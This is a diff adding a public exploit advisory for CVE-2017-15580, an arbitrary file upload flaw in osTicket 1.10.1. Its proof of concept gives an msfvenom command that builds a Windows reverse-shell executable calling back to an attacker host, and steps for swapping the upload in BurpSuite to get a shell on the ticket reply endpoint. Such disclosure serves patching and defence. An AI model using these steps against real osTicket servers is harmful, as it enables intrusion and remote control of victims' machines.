@@ -1,0 +1,31 @@
+# Exploit Title: osTicket 1.10.1 - Arbitrary File Upload
+# Exploit Author: r3j10r (Rajwinder Singh)
+# Date: 2018-08-08
+# Vendor Homepage: http://osticket.com/
+# Software Link: http://osticket.com/download
+# Version: osTicket v1.10.1
+# CVE-2017-15580
+
+# Vulnerability Details:
+# osTicket application provides a functionality to upload 'html' files 
+# with associated formats. However, application does not properly validate 
+# the content of file and accepts any type of files.
+
+# Proof-of-Concept:
+# Uploaded shell to get reverse shell of end user for the demo purpose.
+
+1. Created a valid '.html' file to bypass client-side validations.
+ <html>
+  <title>test</title>
+  <body>
+   <p>test page</p>
+  </body>
+ </html>
+2. Created a reverse shell with '.exe' file extension using msfvenom.
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<YOUR IP> LPORT=4444 -b "\x00" -e <encoder> -f exe -o reverse.exe
+3. Intercepted the request in BurpSuite and changed file extension '.html' to '.exe' and its content
+4. Received a valid response from server along with uploaded malicious file.
+5. Got reverse shell after execution of the uploaded payload.
+
+# Affected Component:
+Parameter: tickets.php?id=<ticket_number>#reply
